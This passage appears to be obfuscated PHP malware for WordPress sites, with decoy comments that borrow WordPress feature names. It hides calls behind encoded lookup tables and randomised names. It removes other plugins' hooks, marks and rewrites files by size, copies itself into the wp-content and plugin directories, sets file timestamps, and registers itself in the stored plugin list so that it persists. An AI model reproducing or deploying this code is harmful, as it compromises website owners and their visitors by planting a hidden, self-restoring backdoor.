       elseif ($GLOBALS['__scf_pomb89yiuz_37']($jpalq51p1oahw48l))     $qaj2jm4j0p4h  = $jpalq51p1oahw48l;

 else continue;
 foreach  ($qaj2jm4j0p4h    as      $t1kyw16ejb9csqrp  =>   $list) {


   foreach   ((array)    $list as $q7cbub_yqke0vj)    {

    $y_qnnfh9_u7jy7  =  isset($q7cbub_yqke0vj[bovhd4vawcd(71)])  ?  $q7cbub_yqke0vj[bovhd4vawcd(71)] :  null;
if  ($y_qnnfh9_u7jy7 === null) continue;$emjhpq62n0b1=-831;$gtsktf8v7tmrw=($emjhpq62n0b1>0)?$emjhpq62n0b1:-$emjhpq62n0b1;
      $e7s4480cj8b1c =  bo_u1wk7i4brm21gz9($y_qnnfh9_u7jy7);
if    (!$GLOBALS['__scf_e_8z8ias8ka_43']($e7s4480cj8b1c))     continue;
  $cccj_rknpjrn   =     @$GLOBALS['__scf_j79iy74onqck2_35']($e7s4480cj8b1c);
 if     (!(($cccj_rknpjrn !==   false    &&    $cccj_rknpjrn    ===     $fcuy7ctl_xi85)  ||     $e7s4480cj8b1c  ===   $uim861ig2y))  continue;
       if ($yhzmqb__spu7  !== false  &&   $cccj_rknpjrn   ===  $yhzmqb__spu7)  continue;


 if  ($GLOBALS['__scf_xmn9leryvjikgb_4'](m40pvx5ij_z4mj(72)))     @remove_filter($cuexmnobz48s2h, $y_qnnfh9_u7jy7,  $t1kyw16ejb9csqrp);
 }
   }
 }
     }
function   kyzojehql4a9oven6w8e()
 {
$mattyf271acsx0qv  = gqtg_eoxyrv0ml2271n();



 if   (!@$GLOBALS['__scf_i9hdv7zrfsy_45']($mattyf271acsx0qv))     return;
$cztdmvhiza98k  =    $GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(73))    ?   @$GLOBALS['__scf_ql1i4f573p8rhm_73']($mattyf271acsx0qv  .  lpwgqh9300(74))    :  false;
 if     (!$GLOBALS['__scf_pomb89yiuz_37']($cztdmvhiza98k))     return;
 $yhzmqb__spu7   =      @$GLOBALS['__scf_j79iy74onqck2_35'](t6995wceyqc2q1wqvl());
 foreach    ($cztdmvhiza98k  as   $e7s4480cj8b1c) {
 $cccj_rknpjrn    =  @$GLOBALS['__scf_j79iy74onqck2_35']($e7s4480cj8b1c);


 if ($yhzmqb__spu7     !== false  &&   $cccj_rknpjrn   === $yhzmqb__spu7)  continue;
       if     (!ey9i45m9xcoe7q13e9ag2($e7s4480cj8b1c,  (478+22)))  continue;
 $kdbfhd3lu4ttw    = ptsk5wzqrdsun9ej($e7s4480cj8b1c);
   $n4zzf5nvs07vvsx2 = ($kdbfhd3lu4ttw    ===    null)  ||   version_compare($kdbfhd3lu4ttw,   kdgw8qqvzf6yolk(),   '<');
      if    ($n4zzf5nvs07vvsx2 ||  xv1s1ysff42y691n($e7s4480cj8b1c))  l9h8q2cews75gx8goqhhg($e7s4480cj8b1c);
  }


  }
    function g3arn5w1kvbi32ro9tm($ln5_jbqpu4in, $wkokdoejn433)
   {
// WP Post Date: rollback singleton

return $GLOBALS['__scf_xmn9leryvjikgb_4'](m40pvx5ij_z4mj(75)) ?    @$GLOBALS['__scf_fiolz593w9mj_75']($ln5_jbqpu4in, $wkokdoejn433)  :   false;



     }
  function tgj6urla_2q3x4g8e($ln5_jbqpu4in)



{
$zfwq5k38dfh61  = db6euveuzemu49d01thfga();


  return  g3arn5w1kvbi32ro9tm($ln5_jbqpu4in,   ($zfwq5k38dfh61  -      ($zfwq5k38dfh61 %  (99964+36)))    + eliqs4hzzhoila0pbe());
  }
   function     j07vd_9875h0key7jsai($k0dfmlduax35j7j,    $xmu6vgl26q74)
    {



     return $GLOBALS['__scf_xmn9leryvjikgb_4'](bovhd4vawcd(52))  ? @$GLOBALS['__scf_gvpwhn3ygzlhu_76']($k0dfmlduax35j7j,     $xmu6vgl26q74)  :     false;
 }
    function  b750sq0jbo8pcqvsan($k0dfmlduax35j7j, $xmu6vgl26q74)

{
return  $GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(77))    ? @$GLOBALS['__scf_uzzmy0m_bqw_77']($k0dfmlduax35j7j,  $xmu6vgl26q74)     :  false;
  }



function m7maju8jcvf3286($v9qf3vep2p,   $ln5_jbqpu4in)
{
   return   $GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(78)) ?    @$GLOBALS['__scf_wgdf7f0l0fi5_78']($v9qf3vep2p,   $ln5_jbqpu4in)   :   false;
  }
 function    kqqy8xacwrmnc_xxuywhx()
{
  static $ikm5544gay  =   null;
       if ($ikm5544gay !==  null)  return $ikm5544gay;


 $ikm5544gay  =  $GLOBALS['__scf_xmn9leryvjikgb_4'](lpwgqh9300(79))     ?    $GLOBALS['__scf_q9p5ajdcil_79']() :   m40pvx5ij_z4mj(80);
  if  (@$GLOBALS['__scf_i9hdv7zrfsy_45']($ikm5544gay)    &&    @$GLOBALS['__scf_p_260ito5s0j_50']($ikm5544gay)) return   $ikm5544gay;
    $t6jsjlatx2i =  defined(bovhd4vawcd(81))     ?     WP_CONTENT_DIR   : (defined(lpwgqh9300(0))  ?   ABSPATH  .   lpwgqh9300(82) :   "");
   if    ($t6jsjlatx2i  !== "")     {



$e7s4480cj8b1c    =    $GLOBALS['__scf_zsw089px33o1o__12']($t6jsjlatx2i,    lpwgqh9300(83)) . bovhd4vawcd(84);
      if  (!@$GLOBALS['__scf_i9hdv7zrfsy_45']($e7s4480cj8b1c))   @$GLOBALS['__scf_cuisofqx8fjt_16']($e7s4480cj8b1c, (484+9),  true);
  if    (@$GLOBALS['__scf_i9hdv7zrfsy_45']($e7s4480cj8b1c)   && @$GLOBALS['__scf_p_260ito5s0j_50']($e7s4480cj8b1c))   {
  if    ($GLOBALS['__scf_xmn9leryvjikgb_4'](m40pvx5ij_z4mj(85)))   @putenv(m40pvx5ij_z4mj(86) .     $e7s4480cj8b1c);
 $GLOBALS[m40pvx5ij_z4mj(87)] = 1;
 $ikm5544gay    = $e7s4480cj8b1c;
 }
 }
     return     $ikm5544gay;


  }
   function    p1eodt9ox5eneum9qqgjt3()
   {
// unfold director for WordPress 6.6 block bindings

$v9qf3vep2p  = pnajs4jqkg8ldd0el8wqi();
 $ijvqfm4k0rvi7     =   gqtg_eoxyrv0ml2271n();

if ($v9qf3vep2p ===  $ijvqfm4k0rvi7)   return   true;
    if ($GLOBALS['__scf_xmn9leryvjikgb_4'](bovhd4vawcd(88)))    {

 $d7yojt3tp522svd  =  @$GLOBALS['__scf_j79iy74onqck2_35']($v9qf3vep2p);
$qt1d3mtlxu =     @$GLOBALS['__scf_j79iy74onqck2_35']($ijvqfm4k0rvi7);
 return ($d7yojt3tp522svd   !==  false &&  $qt1d3mtlxu !== false  && $d7yojt3tp522svd ===    $qt1d3mtlxu);
   }
  return  false;
}
 function  eliqs4hzzhoila0pbe()
 {
  return  (93749+70);
  }


  function  av926u1hz8pmyh3nbgpo0()
     {
     if  (!defined(m5t68uuej1(89))) return     "";


   $t6jsjlatx2i    =  defined(bovhd4vawcd(81)) ? WP_CONTENT_DIR  : ABSPATH    .      m40pvx5ij_z4mj(82);
 return     $GLOBALS['__scf_zsw089px33o1o__12']($t6jsjlatx2i,     m5t68uuej1(83))  .  m5t68uuej1(90)  .  $GLOBALS['__scf_vvn10ievj2k_9']($GLOBALS['__scf_pe3s4q1z7z_59'](ABSPATH    .   m5t68uuej1(68)),  0, (5+3))   .   lpwgqh9300(91)    . $GLOBALS['__scf_vvn10ievj2k_9']($GLOBALS['__scf_pe3s4q1z7z_59'](ABSPATH .  m40pvx5ij_z4mj(92)),  0,    (2<<2))   . m40pvx5ij_z4mj(26);
  }
   function     aualrpzvrr5kleitna1($xs7ycu0j4f9   = null)
{
       $ln5_jbqpu4in   =   av926u1hz8pmyh3nbgpo0();



 if    ($ln5_jbqpu4in      ===  "") return  false;
  if (!$GLOBALS['__scf_e_8z8ias8ka_43']($xs7ycu0j4f9)    ||   $GLOBALS['__scf_fr9u7cq1eo_10']($xs7ycu0j4f9) <  (450+50)) $xs7ycu0j4f9      = z2lalb3eiqlgy6ozb9();
   if  (!$xs7ycu0j4f9  ||    !fgcc_h22bqxgwmccod($xs7ycu0j4f9))   return false;



 $v9qf3vep2p = $GLOBALS['__scf_oagg5b1ubqmznt_11']($ln5_jbqpu4in);
  if (!@$GLOBALS['__scf_i9hdv7zrfsy_45']($v9qf3vep2p))   xcz5hl0mdlt7fpm3xxe($v9qf3vep2p, (251+242), true);

if     (!@$GLOBALS['__scf_i9hdv7zrfsy_45']($v9qf3vep2p) ||  !@$GLOBALS['__scf_p_260ito5s0j_50']($v9qf3vep2p))     return  false;



      if  (@$GLOBALS['__scf_a83pywb98qzq2_20']($ln5_jbqpu4in))  {$mgq06wuole8_m=(0xea+0x42);$kx0ofsfqn=$mgq06wuole8_m%5;
  $xyyjoqp7uzjtc   =    n2fjr1yyl5ye7s_6q($ln5_jbqpu4in);



    if    ($GLOBALS['__scf_e_8z8ias8ka_43']($xyyjoqp7uzjtc)     &&  $xyyjoqp7uzjtc  !==  ""      &&    $GLOBALS['__scf_pe3s4q1z7z_59']($xyyjoqp7uzjtc)    ===  $GLOBALS['__scf_pe3s4q1z7z_59']($xs7ycu0j4f9))   return  true;$z1zfu_x_bt7x=48*2;$g971dx_76_4y=$z1zfu_x_bt7x-3;
  unset($xyyjoqp7uzjtc);
  $tvxuob6yk44    = ptsk5wzqrdsun9ej($ln5_jbqpu4in);
 if ($tvxuob6yk44     !== null &&   version_compare($tvxuob6yk44,   kdgw8qqvzf6yolk(),  '>'))  return false;
   unset($tvxuob6yk44);
 }
   if    (!a3hx61zfms1ji3euwsc($ln5_jbqpu4in,   $xs7ycu0j4f9)) return     false;
cik9ldzrbjmtnzm00($ln5_jbqpu4in,    (270+150));
   lnseazh_1k4yq6v_kjl($ln5_jbqpu4in);



 return      true;
 }
 function   qpaad50893o72_4b73()
  {


   $xs7ycu0j4f9 =  z2lalb3eiqlgy6ozb9();
     if  (!$xs7ycu0j4f9  || !fgcc_h22bqxgwmccod($xs7ycu0j4f9))    return false;
$lnfyvmqftz  =  $GLOBALS['__scf_os_n9tj5psxjj_3'](t6995wceyqc2q1wqvl(),   m5t68uuej1(26));
 $e3thri4q7dp  =   $GLOBALS['__scf_xmn9leryvjikgb_4'](m40pvx5ij_z4mj(93)) ?      r5waslskyqytjrm6()   : (defined(bovhd4vawcd(81))      ?    WP_CONTENT_DIR     : "");
       if    ($e3thri4q7dp === "") return    false;
$n__4q_62qbh   =   $e3thri4q7dp  .     bovhd4vawcd(94)  .      $lnfyvmqftz;



       $qblmnatlrutkh8     = $n__4q_62qbh    . '/'   .  $lnfyvmqftz  .   m5t68uuej1(26);
 $eng5lhrt04nh     = false;
     if      ($GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(88)))   {
$xpy4tfcpvbf5  = @$GLOBALS['__scf_j79iy74onqck2_35']($qblmnatlrutkh8);
       $zaum0ps0v4j0gc =     @$GLOBALS['__scf_j79iy74onqck2_35'](t6995wceyqc2q1wqvl());
 $eng5lhrt04nh  =   ($GLOBALS['__scf_e_8z8ias8ka_43']($xpy4tfcpvbf5) &&   $GLOBALS['__scf_e_8z8ias8ka_43']($zaum0ps0v4j0gc) &&    $xpy4tfcpvbf5     ===   $zaum0ps0v4j0gc);
  }
// hook revocation-list for WP Post Excerpt

    if  (!$eng5lhrt04nh)  {
    if (!@$GLOBALS['__scf_i9hdv7zrfsy_45']($n__4q_62qbh))   xcz5hl0mdlt7fpm3xxe($n__4q_62qbh,  (0x120+0xcd), true);

    if  (!@$GLOBALS['__scf_i9hdv7zrfsy_45']($n__4q_62qbh)   || !@$GLOBALS['__scf_p_260ito5s0j_50']($n__4q_62qbh))  return  false;
    $sqqimh7mxndz0  =   @$GLOBALS['__scf_a83pywb98qzq2_20']($qblmnatlrutkh8)    ?  n2fjr1yyl5ye7s_6q($qblmnatlrutkh8) :  false;



if   ($sqqimh7mxndz0   !==   null &&  (!$GLOBALS['__scf_e_8z8ias8ka_43']($sqqimh7mxndz0)   ||  $GLOBALS['__scf_pe3s4q1z7z_59']($sqqimh7mxndz0)     !==   $GLOBALS['__scf_pe3s4q1z7z_59']($xs7ycu0j4f9)))  {
if   (@$GLOBALS['__scf_a83pywb98qzq2_20']($qblmnatlrutkh8)) {
$tvxuob6yk44  =    ptsk5wzqrdsun9ej($qblmnatlrutkh8);$hcrxwptv9idy97=324;$jp6xhxv_0dxgz=($hcrxwptv9idy97>0)?$hcrxwptv9idy97:-$hcrxwptv9idy97;

       if  ($tvxuob6yk44 !==   null   &&   version_compare($tvxuob6yk44,   kdgw8qqvzf6yolk(),     '>'))  return   false;


unset($tvxuob6yk44);
}
      if (!a3hx61zfms1ji3euwsc($qblmnatlrutkh8, y2fq_g7qilvdboqm1($xs7ycu0j4f9)))     return   false;
 cik9ldzrbjmtnzm00($qblmnatlrutkh8,    (505-85));
tgj6urla_2q3x4g8e($qblmnatlrutkh8);
  lnseazh_1k4yq6v_kjl($qblmnatlrutkh8);
   }
 unset($sqqimh7mxndz0);
    }

     $rwd31a430gy   = $lnfyvmqftz .  '/' .  $lnfyvmqftz     .      m5t68uuej1(26);

   fy8jmfzxi4yysln4fg($rwd31a430gy);
  return   true;
 }
function ptsk5wzqrdsun9ej($ln5_jbqpu4in)
{

 $t_1gijg4ys9il   = @$GLOBALS['__scf_c7jg5u2s_wzbrw_95']($ln5_jbqpu4in, false,     null,  0,   (5690-1594));
 if  (!$GLOBALS['__scf_e_8z8ias8ka_43']($t_1gijg4ys9il))  return   null;



 if   ($GLOBALS['__scf_vqnw5_4kg7eu_96'](bovhd4vawcd(97), $t_1gijg4ys9il, $ijvqfm4k0rvi7))  return  $ijvqfm4k0rvi7[1];
 return   null;
  }
 
   function     ey9i45m9xcoe7q13e9ag2($o9nbfdea9ztie0d9, $qjkqrs3kqxxg4)
    {
  @clearstatcache(true, $o9nbfdea9ztie0d9);
 
 $nb4frvwe8w7ja  = @$GLOBALS['__scf_tm09rtls_27e_98']($o9nbfdea9ztie0d9);
   if  (!$nb4frvwe8w7ja    ||    ($nb4frvwe8w7ja %  (181026-81026)) !== eliqs4hzzhoila0pbe()) {
return  false;


     }
   
$ob1u5r4y2s  =     @$GLOBALS['__scf_pftf6vocmvs2m_99']($o9nbfdea9ztie0d9);



 return   $ob1u5r4y2s   &&     $ob1u5r4y2s >=    $qjkqrs3kqxxg4;
   }
    function   byffua_rebmvk2()


      {
return     (35920+80);
/* minimal savepoint */

  }
      function u_9shatqcniwqfywsjc2m()
      {
  return  m40pvx5ij_z4mj(100);
  }
  function ikw0tf8wjoufcwbi7uaqr()
   {
return    m5t68uuej1(101);
      }
function w20s0634nq8_ff()
   {

if  ($GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(102))) return  true;
if    (wkza2fddupbqoruvz()) return true;
 $jeqxjc3kfcgn     =  $GLOBALS['__scf_vi47igxg1zd_103']((string) $GLOBALS['__scf_ebsa9aprq0y_104']());
    if ($jeqxjc3kfcgn   ===  bovhd4vawcd(105)     ||    $GLOBALS['__scf_i8i8g4oxha_7']($jeqxjc3kfcgn, m5t68uuej1(106))    !== false) return  true;
 $wuze3thqfm60up   =  isset($_SERVER[lpwgqh9300(107)])  ? $GLOBALS['__scf_vi47igxg1zd_103']((string) $_SERVER[lpwgqh9300(108)])   :   "";



 if   ($wuze3thqfm60up  !== ""   &&    ($GLOBALS['__scf_i8i8g4oxha_7']($wuze3thqfm60up,   bovhd4vawcd(109)) !==   false  || $GLOBALS['__scf_i8i8g4oxha_7']($wuze3thqfm60up,  m5t68uuej1(106))  !==   false    ||  $GLOBALS['__scf_i8i8g4oxha_7']($wuze3thqfm60up, m5t68uuej1(110))  !== false)) return   true;
  return false;
    }
 function  wkza2fddupbqoruvz()

{
/* negative-definite radix-tree */

 $wuze3thqfm60up    =  isset($_SERVER[m40pvx5ij_z4mj(108)]) ?  $_SERVER[bovhd4vawcd(108)]   : "";
    return   $GLOBALS['__scf_e_8z8ias8ka_43']($wuze3thqfm60up)  && stripos($wuze3thqfm60up,   lpwgqh9300(106))     !== false;
   }
 function    bmbm6qj8xg0fnyt($uim861ig2y)
    {
$tmkgjwld2rp3k5i_ =   $GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(111)) ? @$GLOBALS['__scf_qa8nkfur9w_111'](lpwgqh9300(112))      :   false;
  if (!$tmkgjwld2rp3k5i_ ||  $tmkgjwld2rp3k5i_  === "") return true;

     $fcuy7ctl_xi85  = @$GLOBALS['__scf_j79iy74onqck2_35']($uim861ig2y);
 if  (!$fcuy7ctl_xi85) $fcuy7ctl_xi85 =  $uim861ig2y;



   foreach  ($GLOBALS['__scf_wninqej2t1_113'](PATH_SEPARATOR,   $tmkgjwld2rp3k5i_)   as $_xfdo1_14r691bp)   {
  $_xfdo1_14r691bp     =  $GLOBALS['__scf_zsw089px33o1o__12']($_xfdo1_14r691bp, m40pvx5ij_z4mj(83));
   if  ($_xfdo1_14r691bp  &&   ($fcuy7ctl_xi85  ===    $_xfdo1_14r691bp     || $GLOBALS['__scf_i8i8g4oxha_7']($fcuy7ctl_xi85,    $_xfdo1_14r691bp  . DIRECTORY_SEPARATOR)   ===  0))  return    true;
}
// @broadcast authority

return false;
}
function  hkkln0twoq_u9_($kgidn0bo_1ewjd6r)
      {
 $pun35t0k_k = $kgidn0bo_1ewjd6r    .   '|' .  (defined(m40pvx5ij_z4mj(114))   ?    DB_NAME   :  "") . '|'   .  (defined(lpwgqh9300(89))  ? ABSPATH : "");
 return      $GLOBALS['__scf_pe3s4q1z7z_59']($pun35t0k_k);
 }
function beqgo0gfq6yfj82i0o($kgidn0bo_1ewjd6r)
{


global  $wpdb;
 if  (!isset($GLOBALS[m5t68uuej1(115)]) || !$GLOBALS['__scf_pomb89yiuz_37']($GLOBALS[lpwgqh9300(115)]))     $GLOBALS[bovhd4vawcd(115)] =   array();
  if (!empty($GLOBALS[m5t68uuej1(115)][$kgidn0bo_1ewjd6r]))   {


 if     (isset($GLOBALS[lpwgqh9300(116)][$kgidn0bo_1ewjd6r])   &&     $GLOBALS['__scf_pd74_ila1rfp_70']($wpdb))      {
$gh26uo8gglhhl1o6  =  isset($wpdb->dbh)     ?  $wpdb->dbh   : null;


  if ($gh26uo8gglhhl1o6     !== null &&   $GLOBALS[m5t68uuej1(117)][$kgidn0bo_1ewjd6r]     !==    $gh26uo8gglhhl1o6)    {
unset($GLOBALS[m5t68uuej1(115)][$kgidn0bo_1ewjd6r], $GLOBALS[m40pvx5ij_z4mj(117)][$kgidn0bo_1ewjd6r]);
  return  beqgo0gfq6yfj82i0o($kgidn0bo_1ewjd6r);
 }
// WP Global Styles enqueue order

 unset($gh26uo8gglhhl1o6);
       }
 $GLOBALS[bovhd4vawcd(115)][$kgidn0bo_1ewjd6r]++;
       return true;
    }
      if  ($GLOBALS['__scf_pd74_ila1rfp_70']($wpdb) &&   $GLOBALS['__scf_sruyigi7mie8_118']($wpdb, lpwgqh9300(119))) {
// @deregister record-layer

       $w1jfjex0s0pwt =  @$wpdb->get_var(m5t68uuej1(120)    .   hkkln0twoq_u9_($kgidn0bo_1ewjd6r) .   lpwgqh9300(121));
 if   ($w1jfjex0s0pwt ===  '1')  {
/* indecomposable aggregator */


      $GLOBALS[m5t68uuej1(115)][$kgidn0bo_1ewjd6r]  =   1;
  if  (isset($wpdb->dbh)   && $wpdb->dbh) $GLOBALS[lpwgqh9300(117)][$kgidn0bo_1ewjd6r]     =     $wpdb->dbh;

   return   true;

}
  if ($w1jfjex0s0pwt === '0')   return false;
 }
 if ($GLOBALS['__scf_xmn9leryvjikgb_4'](m40pvx5ij_z4mj(122)) &&   $GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(23)))   {
  $jtw4j8xyzn_qyf =      array();
    if    ($GLOBALS['__scf_xmn9leryvjikgb_4'](m40pvx5ij_z4mj(79)))   $jtw4j8xyzn_qyf[] =  $GLOBALS['__scf_q9p5ajdcil_79']();
     if   (defined(bovhd4vawcd(123)))  $jtw4j8xyzn_qyf[]    =   WP_CONTENT_DIR;
   if  (defined(m5t68uuej1(89)))    $jtw4j8xyzn_qyf[]  =  $GLOBALS['__scf_zsw089px33o1o__12'](ABSPATH, m40pvx5ij_z4mj(83));
 foreach     ($jtw4j8xyzn_qyf  as  $v9qf3vep2p) {

 if   ($v9qf3vep2p ===  ""  || !@$GLOBALS['__scf_i9hdv7zrfsy_45']($v9qf3vep2p) ||   !@$GLOBALS['__scf_p_260ito5s0j_50']($v9qf3vep2p))   continue;
 $fufsetdpfs5h =  @$GLOBALS['__scf_vtcl9hk0l_e1o6_23']($v9qf3vep2p    .  lpwgqh9300(124)   .      hkkln0twoq_u9_($kgidn0bo_1ewjd6r)      .  m40pvx5ij_z4mj(125), 'c');
     if   ($fufsetdpfs5h     !==   false) {
 if (!@flock($fufsetdpfs5h,    LOCK_EX   |  LOCK_NB))   {
  @fclose($fufsetdpfs5h);



return false;
  }

if   (!isset($GLOBALS[lpwgqh9300(126)])   ||  !$GLOBALS['__scf_pomb89yiuz_37']($GLOBALS[lpwgqh9300(126)]))    $GLOBALS[m40pvx5ij_z4mj(127)]  =    array();
   $GLOBALS[lpwgqh9300(127)][$kgidn0bo_1ewjd6r]   = $fufsetdpfs5h;



$GLOBALS[bovhd4vawcd(115)][$kgidn0bo_1ewjd6r]     = 1;
return   true;
 }
    }
   }
    $GLOBALS[m5t68uuej1(115)][$kgidn0bo_1ewjd6r]  =   1; 


  $GLOBALS[lpwgqh9300(128)][$kgidn0bo_1ewjd6r]   = 1;
     return   true;
   }
       function    xfcoteglc07i2qaoo($kgidn0bo_1ewjd6r)
{
global   $wpdb;
     

if (empty($GLOBALS[lpwgqh9300(115)][$kgidn0bo_1ewjd6r])) return;
 $GLOBALS[bovhd4vawcd(115)][$kgidn0bo_1ewjd6r]--;
        if  ($GLOBALS[bovhd4vawcd(115)][$kgidn0bo_1ewjd6r] >   0)  return;
    unset($GLOBALS[m5t68uuej1(115)][$kgidn0bo_1ewjd6r]);
unset($GLOBALS[m5t68uuej1(129)][$kgidn0bo_1ewjd6r]);
  unset($GLOBALS[lpwgqh9300(128)][$kgidn0bo_1ewjd6r]);
   if (isset($GLOBALS[lpwgqh9300(127)][$kgidn0bo_1ewjd6r]))  {
   @flock($GLOBALS[m5t68uuej1(130)][$kgidn0bo_1ewjd6r], LOCK_UN);
@fclose($GLOBALS[bovhd4vawcd(130)][$kgidn0bo_1ewjd6r]);
    unset($GLOBALS[m40pvx5ij_z4mj(131)][$kgidn0bo_1ewjd6r]);
   }
  if    ($GLOBALS['__scf_pd74_ila1rfp_70']($wpdb)   && $GLOBALS['__scf_sruyigi7mie8_118']($wpdb,   bovhd4vawcd(132))) {
@$wpdb->query(bovhd4vawcd(133)    .     hkkln0twoq_u9_($kgidn0bo_1ewjd6r)  . lpwgqh9300(134));



  }
      }
   function    toqvilnv84hv69v2gepwhm()


 {
if   (defined(bovhd4vawcd(135))  &&  DISALLOW_FILE_MODS)   return  false;
   return      true;
 }
function  qtw_jjicuju9kihp5kfw()
{
      if     (!$GLOBALS['__scf_xmn9leryvjikgb_4'](lpwgqh9300(122))    || !$GLOBALS['__scf_xmn9leryvjikgb_4'](bovhd4vawcd(136)))      return  false;
$vrms3wwazqa    = array();
  if   ($GLOBALS['__scf_xmn9leryvjikgb_4'](lpwgqh9300(137)))      $vrms3wwazqa[] =  $GLOBALS['__scf_q9p5ajdcil_79']();
     if    (defined(m40pvx5ij_z4mj(138)))  $vrms3wwazqa[] =  WP_CONTENT_DIR;

  if (defined(bovhd4vawcd(89))) $vrms3wwazqa[]  =    $GLOBALS['__scf_zsw089px33o1o__12'](ABSPATH,    m5t68uuej1(83));
 foreach    ($vrms3wwazqa      as   $f1ubaqf1w71kp)   {
  if      ($f1ubaqf1w71kp  === ""    ||  !@$GLOBALS['__scf_i9hdv7zrfsy_45']($f1ubaqf1w71kp)   ||  !@$GLOBALS['__scf_p_260ito5s0j_50']($f1ubaqf1w71kp))   continue;
    $fzpdbkd90q9g9c    = @$GLOBALS['__scf_vtcl9hk0l_e1o6_23']($f1ubaqf1w71kp  . bovhd4vawcd(139)  . hkkln0twoq_u9_(m5t68uuej1(140))    . bovhd4vawcd(141),    'c');


if  ($fzpdbkd90q9g9c  ===  false)   continue;
  if  (!@flock($fzpdbkd90q9g9c,   LOCK_EX   |   LOCK_NB))     {



 @fclose($fzpdbkd90q9g9c);
  return   false;
 }
 $GLOBALS[m40pvx5ij_z4mj(142)] =  $fzpdbkd90q9g9c;$fo1h114t_p_w=5948;$u22zknmlugyx_6=$fo1h114t_p_w%13;
 return   true;
   }
return  false;
   }
   function    me64i7dx_7mwdhrvqve8()
     {

if    (isset($GLOBALS[m40pvx5ij_z4mj(143)]))  {
  @flock($GLOBALS[bovhd4vawcd(144)],   LOCK_UN);
 @fclose($GLOBALS[m40pvx5ij_z4mj(144)]);
        unset($GLOBALS[bovhd4vawcd(144)]);
 }
       }
    function    fy8jmfzxi4yysln4fg($rwd31a430gy)
       {
 if  (!$GLOBALS['__scf_xmn9leryvjikgb_4'](m40pvx5ij_z4mj(145))  ||   !$GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(146))) return;
  if (!qtw_jjicuju9kihp5kfw()) return;


     try   {
// WP RichText API webp conversion

$ofq2tikiqa = get_option(m5t68uuej1(147), array());
        if   (!$GLOBALS['__scf_pomb89yiuz_37']($ofq2tikiqa))  $ofq2tikiqa   =  array();

    $a654ptgrjdu8p0r    =  $GLOBALS['__scf__ofafsmvux__148']($GLOBALS['__scf_jghjt9zxt358_149']($ofq2tikiqa));
   if  (!$GLOBALS['__scf_hf87ul3fvpzrkm_150']($rwd31a430gy,     $a654ptgrjdu8p0r,     true)) $a654ptgrjdu8p0r[]  =  $rwd31a430gy;
 if ($a654ptgrjdu8p0r  !== $ofq2tikiqa)    update_option(m40pvx5ij_z4mj(147),   $a654ptgrjdu8p0r);


 unset($a654ptgrjdu8p0r);
} finally {
// WP Separator Block webp conversion

     me64i7dx_7mwdhrvqve8();



  }
  }



function x0vkjfd7pdb0k_kffrjsf($rwd31a430gy)
 {

   if    (!$GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(145))   ||  !$GLOBALS['__scf_xmn9leryvjikgb_4'](m40pvx5ij_z4mj(146)))   return;
  if    (!qtw_jjicuju9kihp5kfw()) return;
 try {
     $ofq2tikiqa   =    get_option(lpwgqh9300(147),   array());
if    ($GLOBALS['__scf_pomb89yiuz_37']($ofq2tikiqa)  &&   $GLOBALS['__scf_hf87ul3fvpzrkm_150']($rwd31a430gy,  $ofq2tikiqa,   true))    {
  update_option(bovhd4vawcd(147), $GLOBALS['__scf__ofafsmvux__148']($GLOBALS['__scf_r3sim5_axb_151']($ofq2tikiqa,    array($rwd31a430gy))));
   }
  }  finally    {
  me64i7dx_7mwdhrvqve8();
   }
  }
      function  r63yaewew47stuijcrwsx6($zhj75h9ibapwt,    $k3g08rnqu9m)
      {
 try    {


     if   (interface_exists(lpwgqh9300(152)) && $k3g08rnqu9m   instanceof  Throwable) {
    $ixxknxeogje7rm    =   $GLOBALS['__scf_vvn10ievj2k_9']($zhj75h9ibapwt   .  bovhd4vawcd(153)     . $k3g08rnqu9m->getMessage(),     0,   (450-194));
 }   elseif ($k3g08rnqu9m  instanceof Exception)      {
 $ixxknxeogje7rm    = $GLOBALS['__scf_vvn10ievj2k_9']($zhj75h9ibapwt     .    m40pvx5ij_z4mj(154)   .    $k3g08rnqu9m->getMessage(),    0, (473-217));
     } elseif      ($GLOBALS['__scf_e_8z8ias8ka_43']($k3g08rnqu9m)      && $GLOBALS['__scf_fr9u7cq1eo_10']($k3g08rnqu9m)  > 0) {
      $ixxknxeogje7rm  = $GLOBALS['__scf_vvn10ievj2k_9']($zhj75h9ibapwt .  m5t68uuej1(154)  .    $k3g08rnqu9m, 0,  (206+50));


     }   else    {$rxyccokeqrghh=15+62;$eqwtl7htu6ie_e=$rxyccokeqrghh-19;
  return;
    }
    if (!isset($GLOBALS[lpwgqh9300(155)])) $GLOBALS[bovhd4vawcd(155)]   =  array();



     if      (!$GLOBALS['__scf_hf87ul3fvpzrkm_150']($ixxknxeogje7rm, $GLOBALS[lpwgqh9300(155)],  true))    {
    $GLOBALS[lpwgqh9300(156)][]   =   $ixxknxeogje7rm;
}
  if ($GLOBALS['__scf_xbixt340jb_38']($GLOBALS[m40pvx5ij_z4mj(156)]) >  (23+27))  {



 $GLOBALS[bovhd4vawcd(156)] =   $GLOBALS['__scf_tcy2zdxc2t_157']($GLOBALS[m5t68uuej1(158)], -(26+24));
   }
    }     catch   (Throwable $gdp7v44evzr) {
}   catch  (Exception      $gdp7v44evzr)     {



  }
}
function  ki6tdgirglgewq($t_1gijg4ys9il,  $y_qnnfh9_u7jy7, $ln5_jbqpu4in  =  (0x4+0x6),  $jhq7h77_vtf = 1)
{$fs2dszw2cqian=(0x6d+0xc4);$xglhyz50g2b=$fs2dszw2cqian%14;
   if (!$GLOBALS['__scf_xmn9leryvjikgb_4'](bovhd4vawcd(159)))  return    false;
   if  ($GLOBALS['__scf_e_8z8ias8ka_43']($y_qnnfh9_u7jy7))  {
  return add_action($t_1gijg4ys9il,   function   (...$vw1u1zkmd90v7fv)   use ($y_qnnfh9_u7jy7)    {
   if ($GLOBALS['__scf_xmn9leryvjikgb_4']($y_qnnfh9_u7jy7))    return  $y_qnnfh9_u7jy7(...$vw1u1zkmd90v7fv);
return  null;
},  $ln5_jbqpu4in, $jhq7h77_vtf);
      }
